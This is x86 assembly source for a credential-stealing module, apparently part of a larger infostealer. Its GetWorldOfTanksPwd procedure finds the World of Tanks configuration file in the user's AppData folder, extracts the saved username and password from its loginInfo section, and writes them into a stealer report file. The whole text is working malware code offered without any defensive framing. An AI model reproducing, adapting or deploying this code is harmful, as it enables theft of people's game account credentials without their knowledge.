     
.data?
      wot_dir            db   200h dup (?)
      wot_user           db   200h dup (?)
      wot_pwd            db   200h dup (?)
     
.code

GetWorldOfTanksPwd proc
      LOCAL   WTF:DWORD
      LOCAL   hFind:DWORD
      LOCAL   p1:DWORD
      LOCAL   pbegin:DWORD
      LOCAL   pend:DWORD
      LOCAL   gbegin:DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], WOT_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetWorldOfTanksPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      ; Get WoT file path
      mov     byte ptr [wot_dir], 0
      push    0
      push    CSIDL_APPDATA
      push    offset wot_dir
      push    0
      call    dword ptr [_SHGetSpecialFolderPath]
      push    offset wot_dir
      call    dword ptr [_PathAddBackslash]
      lstrcat, addr wot_dir, addr wot_path1
      ; Map it
      invoke  MapFile, addr wot_dir, addr mfile, MAP_FILE_A
      test    eax, eax
      je      no_wot
      
      ; Parse teh data
      xor     ebx, ebx
    wot_parse_lp:
      mov     ecx, dword ptr [mfile.lpMem]
      add     ecx, ebx
      mov     dword ptr [p1], ecx
      ; find <loginInfo>
      lstrlen, p1
      push    eax
      push    sizeof wot_sector1
      push    dword ptr [p1]
      push    offset wot_sector1
      call    strpos
      test    eax, eax
      je      wot_no_pwds_here
      mov     dword ptr [pbegin], eax
      ; find </loginInfo>
      lstrlen, pbegin
      push    eax
      push    sizeof wot_sector2
      push    dword ptr [pbegin]
      push    offset wot_sector2
      call    strpos
      test    eax, eax
      je      wot_no_pwds_here
      mov     dword ptr [pend], eax
      
      ; find <user>
      lstrlen, pbegin
      push    eax
      push    sizeof wot_user1
      push    dword ptr [pbegin]
      push    offset wot_user1
      call    strpos
      test    eax, eax
      je      wot_no_pwds_here
      add     eax, sizeof wot_user1
      mov     dword ptr [gbegin], eax
      ; find </user>
      lstrlen, gbegin
      push    eax
      push    sizeof wot_user2
      push    dword ptr [gbegin]
      push    offset wot_user2
      call    strpos
      test    eax, eax
      je      wot_no_pwds_here
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr wot_user, gbegin, eax
      
      ; find <password>
      lstrlen, pbegin
      push    eax
      push    sizeof wot_pwd1
      push    dword ptr [pbegin]
      push    offset wot_pwd1
      call    strpos
      test    eax, eax
      je      wot_no_pwds_here
      add     eax, sizeof wot_pwd1
      mov     dword ptr [gbegin], eax
      ; find </password>
      lstrlen, gbegin
      push    eax
      push    sizeof wot_pwd2
      push    dword ptr [gbegin]
      push    offset wot_pwd2
      call    strpos
      test    eax, eax
      je      wot_no_pwds_here
      sub     eax, dword ptr [gbegin]
      add     eax, 1
      lstrcpyn, addr wot_pwd, gbegin, eax
      
      lstrlen, addr wot_user
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_LOGIN
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr wot_user, plen, addr SNW, NULL
      
      lstrlen, addr wot_pwd
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, addr wot_pwd, plen, addr SNW, NULL
      
      mov     ebx, dword ptr [pend]
      sub     ebx, dword ptr [mfile.lpMem]
      inc     ebx
      cmp     ebx, dword ptr [mfile.dwFileSize]
      jle     wot_parse_lp
      
    wot_no_pwds_here:
      ; Fuck you guys, I'm goin' home
      invoke  UnmapFile, addr mfile
    no_wot:
      
    GetWorldOfTanksPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetWorldOfTanksPwd endp
